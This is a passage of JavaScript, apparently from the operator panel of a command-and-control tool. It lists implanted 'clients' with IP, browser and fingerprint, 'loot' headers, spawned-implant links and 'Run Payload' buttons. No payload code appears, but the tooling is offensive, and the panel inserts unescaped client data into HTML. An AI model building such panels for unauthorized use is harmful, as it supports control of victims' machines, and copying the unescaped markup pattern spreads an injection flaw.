	// First clear out our existing cards
	while (cardStack.firstChild)
	{
		cardStack.firstChild.remove();
	}

	// Add our top observer for lazy loading
	var topObserverElement = document.createElement('div');
	topObserverElement.setAttribute("id", "topScrollObserver");
	topObserverElement.style.minHeight = "1px";
	topObserverElement.style.flexShrink = "0";
	cardStack.appendChild(topObserverElement);


	// Sort the clients
	var jsonResponse = await sortClients(clientsJson);

    const showBeacons = document.getElementById('toggleBrowsers').checked;

    // Auto-Select Logic: When switching types, load the last selected client of that type
    if (showBeacons) {
        if (selectedClientId !== lastSelectedBrowserId) {
            selectedClientId = lastSelectedBrowserId;
            if (selectedClientId) getClientDetails(selectedClientId);
        }
    } else {
        if (selectedClientId !== lastSelectedAppId) {
            selectedClientId = lastSelectedAppId;
            if (selectedClientId) getClientDetails(selectedClientId);
        }
    }

    // Auto-refresh detail view if a beacon is selected (to update injection status)
    if (selectedClientId && !refreshingDetails) {
        const selectedClient = clientsJson.find(c => c.id == selectedClientId);
        if (selectedClient && selectedClient.clientType === 'bex-beacon') {
            getClientDetails(selectedClientId);
        }
    }

	// We need to filter the clients here too
	jsonResponse = filterClients(jsonResponse);

    // Handle Loot Header based on Selected Client (factually representing what's shown)
    const lootHeader = document.getElementById('loot-header-text');
    
    if (selectedClientId) {
        // Find the selected client in the FULL list
        const selectedClient = clientsJson.find(c => c.id == selectedClientId);
        if (selectedClient && lootHeader) {
            const label = selectedClient.clientType === 'bex-beacon' ? "Browser Loot" : "App Loot";
            lootHeader.innerHTML = `<b>&nbsp;&nbsp;${label}</b>`;
        }
	} else {
        // No selection
        if (lootHeader) {
            lootHeader.innerHTML = showBeacons ? "<b>&nbsp;&nbsp;Browser Loot</b>" : "<b>&nbsp;&nbsp;App Loot</b>";
        }
    }

	var topCount = parseInt(clientLoadCount) + parseInt(clientLoadExtraCount);

	// console.log("$$$$ From: " + 0 + ", to: " + topCount);
	if (topCount > jsonResponse.length)
	{
		topCount = jsonResponse.length;
	}
	// console.log("$$$$ From: " + 0 + ", to: " + topCount);

	// let's layout our clients
	for (let i = 0; i < topCount; i++)
	{
		client = jsonResponse[i];

		// Filter by client type toggle
		const showBeacons = document.getElementById('toggleBrowsers').checked;
		if (showBeacons && client.clientType !== 'bex-beacon') continue;
		if (!showBeacons && client.clientType === 'bex-beacon') continue;

		if (document.getElementById('onlyStarredClients').checked == true)
		{
			if (!client.isStarred)
			{
				if (client.id == selectedClientId)
				{
					// need to unselect the client before we hide it
					unselectAllClients();
				}
				continue;
			}
			else
			{
				console.log("Filtering stars, client passes check: " + client.nickname);
			}
		}


		var card = document.createElement('div');
		card.className = 'card';
		card.setAttribute("clientIndex", client.id);
		card.setAttribute("id", "clientCard" + client.id);

		// On refresh, see if we were the previously
		// selected client and re-select

		// console.log("Selected ID: " + selectedClientId + ", current client id: " + client.id);
		if (client.id == selectedClientId)
		{
			card.classList.add("table-active");
		}


		var cardBody = document.createElement('div');
		cardBody.className = 'card-body';

		var cardTitle = document.createElement('h5');
		cardTitle.className = "card-title";

		var cardSubtitle = document.createElement('h6');

		// Add tooltip
		cardSubtitle.className = "card-subtitle mb-2 text-muted";
		cardSubtitle.setAttribute("data-toggle", "tooltip")
		cardSubtitle.setAttribute("title", "Last Update: " + client.lastSeen);
		cardSubtitle.setAttribute("data-placement", "left");
		const tooltipOptions = {
    	animation: true, // Optional: Enable tooltip animation
      delay: { show: 300, hide: 100 }, // Optional: Set tooltip show/hide delay in milliseconds
      container: cardSubtitle // Optional: Specify a container for the tooltip
  };
  new bootstrap.Tooltip(cardSubtitle, tooltipOptions);


  var cardText = document.createElement('p');
  cardText.className = 'card-text';

  var clientName = "";
  if (client.tag != "")
  {
  	clientName = client.tag + "/" + client.nickname;
  }
  else
  {
  	clientName = client.nickname;
  }

  cardTitle.innerHTML = "<u>" + clientName + "</u>";

  if (client.isStarred)
  {
  	cardTitle.innerHTML += '<img src="/protectedStatic/star-fill.svg" style="float: right;" onclick="toggleStar(this, event,' + `'` + client.id + `','` + client.nickname + `')">`;
  }
  else
  {
  	cardTitle.innerHTML += '<img src="/protectedStatic/star.svg" style="float: right;" onclick="toggleStar(this, event,' + `'` + client.id + `','` + client.nickname + `')">`;
  }


  cardTitle.innerHTML += '<img src="/protectedStatic/x-circle.svg" style="float: right; margin-right: 10px;" onclick="blockClient(this, event,' + `'` + client.id + `','` + client.nickname + `')">`;
  cardTitle.innerHTML += '&nbsp;&nbsp;&nbsp';

  cardText.innerHTML  = "IP:<b>&nbsp;&nbsp;&nbsp;" + client.ip + "</b>";


	//What to do about client notes?
  if (client.notes.length > 0)
  {
  	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showNoteEditor(event,' + `'` 
  	+ client.id + `','` + client.nickname  + `','` + client.notes + `'`+ ')>Edit Notes</button>';
  }
  else
  {
  	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showNoteEditor(event,' + `'` 
  	+ client.id + `','` + client.nickname  + `','` + client.notes + `'`+ ')>Add Notes</button>';
  }

  // Optional display of fingerprints, turned on in app settings and an option in the payload 
  if (fingerprintJson.fingerprintEnabled)
  {
  	cardText.innerHTML += "<br>Fingerprint:<b>&nbsp;&nbsp;&nbsp;" + client.fingerprint + "</b>";
  }

  cardText.innerHTML += "<br>Platform:<b>&nbsp;&nbsp;&nbsp;" + client.platform + "</b><br>";
  cardText.innerHTML += "Browser:<b>&nbsp;&nbsp;&nbsp;" + client.browser + "</b>";

  if (client.clientType !== 'bex-beacon') {
    if (client.hasJobs)
    {
      cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;border-width:2px;border-color:green" onclick=showSingleClientPayloadModal(event,' + `'` 
      + client.id + `'`+ ')>Run Payload</button>';  
    }	
    else
    {
      cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showSingleClientPayloadModal(event,' + `'` 
      + client.id + `'`+ ')>Run Payload</button>';
    }
  }


  cardSubtitle.innerHTML  = "First Seen: " + humanized_time_span(client.firstSeen) + "&nbsp;&nbsp;&nbsp;";
  cardSubtitle.innerHTML += "Last Seen: <b>" + humanized_time_span(client.lastSeen) + "</b>";

  if (client.clientType !== 'bex-beacon' && client.domain) {
      cardSubtitle.innerHTML += "<br>Domain: <b>" + client.domain + "</b>";
  }

  cardBody.appendChild(cardTitle);
  cardBody.appendChild(cardSubtitle);
  cardBody.appendChild(cardText);

  // Add child client summary if it's a beacon
  if (client.clientType === 'bex-beacon') {
      const myChildren = clientsJson.filter(c => c.parentUUID === client.uuid);
      if (myChildren.length > 0) {
          var childrenDiv = document.createElement('div');
          childrenDiv.className = 'mt-2 border-top pt-2';
          childrenDiv.innerHTML = `<small class="text-muted">Spawned Implants:</small>`;
          
          myChildren.forEach(child => {
              var childBadge = document.createElement('div');
              childBadge.className = 'badge bg-dark text-white me-1 p-1';
              childBadge.style.cursor = 'pointer';
              const name = child.tag ? `${escapeHTML(child.tag)}/${escapeHTML(child.nickname)}` : escapeHTML(child.nickname);
              childBadge.innerHTML = `<small>${name}</small>`;
              childBadge.onclick = (e) => {
                  e.stopPropagation();
                  // Select this child
                  // First ensure we are showing Apps
                  document.getElementById('toggleApps').click();
                  
                  // Wait for update to finish then click
                  setTimeout(() => {
                      const childCard = document.getElementById('clientCard' + child.id);
                      if (childCard) childCard.click();
                  }, 100);
              };
              childrenDiv.appendChild(childBadge);
          });
          cardBody.appendChild(childrenDiv);
      }
  } else if (client.parentUUID) {
      // Add "Spawned By" link for child implants
      const parent = clientsJson.find(c => c.uuid === client.parentUUID);
      if (parent) {
          var parentDiv = document.createElement('div');
          parentDiv.className = 'mt-2 border-top pt-2';
          parentDiv.innerHTML = `<small class="text-muted">Spawned By:</small> `;
          
          var parentBadge = document.createElement('div');
          parentBadge.className = 'badge bg-info text-dark p-1';
          parentBadge.style.cursor = 'pointer';
          const name = parent.tag ? `${escapeHTML(parent.tag)}/${escapeHTML(parent.nickname)}` : escapeHTML(parent.nickname);
          parentBadge.innerHTML = `<small>${name}</small>`;
          parentBadge.onclick = (e) => {
              e.stopPropagation();
              // Switch to Browsers
              document.getElementById('toggleBrowsers').click();
              
              // Wait for update then click parent
              setTimeout(() => {
                  const parentCard = document.getElementById('clientCard' + parent.id);
                  if (parentCard) parentCard.click();
              }, 100);
          };
          parentDiv.appendChild(parentBadge);
          cardBody.appendChild(parentDiv);
      }
  }

  card.appendChild(cardBody);

  card.onclick =  function(event) {
    	// console.log("!!! CLIENT CARD CLICKED!!!");
  	unselectAllClients();
  	clickedClient = this.getAttribute("clientIndex");
  	this.classList.add("table-active");
  	selectedClientId = clickedClient;
  	getClientDetails(selectedClientId);
  };

  cardStack.appendChild(card);    	
  }



var bottomObserverElement = document.createElement('div');
bottomObserverElement.style.minHeight = "1px";
bottomObserverElement.style.flexShrink = "0";
bottomObserverElement.setAttribute("id", "bottomScrollObserver");
cardStack.appendChild(bottomObserverElement);



let isLoading    = false;
let bottomInView = false;

let loadMoreTrigger     = document.getElementById('bottomScrollObserver');
let loadPrevioustrigger = document.getElementById('topScrollObserver');


// Observer for scrolling back up to the top of client list
const topObserver = new IntersectionObserver((entries, observer) => {
	entries.forEach(entry => {
		if (entry.isIntersecting && !isLoading && !bottomInView) {
			isLoading = true;
			//console.log("-*-*-*-*- Time to reset extra count!");
			clientLoadExtraCount = 0;
			// updateClients();
			isLoading = false;
		}
	});
}, {
	root: cardStack,
  threshold: 0.1  // Adjust threshold as needed
});





// Observer for scrolling to bottom of client list
const bottomObserver = new IntersectionObserver((entries, observer) => {
	for (const entry of entries) {
		bottomInView = entry.isIntersecting;
		if (entry.isIntersecting && !isLoading) {
			isLoading = true;
			// console.log("@@@@@@ Time to load more!");
			clientLoadExtraCount += clientIncrementAmount;
			// If the bottom is in view we can't just keep calling updateClients, it clobbers things
			throttledUpdateClients();
			isLoading = false;
		}
	}
}, {
	root: cardStack,
  threshold: 0.1  // Adjust threshold as needed
});



// Disconnect our observers used for lazy loading
if (topObserver) 
{
  topObserver.disconnect();
}
if (bottomObserver) 
{
  bottomObserver.disconnect();
}


bottomObserver.observe(loadMoreTrigger);
topObserver.observe(loadPrevioustrigger);

// End update clients
}







updateClients();


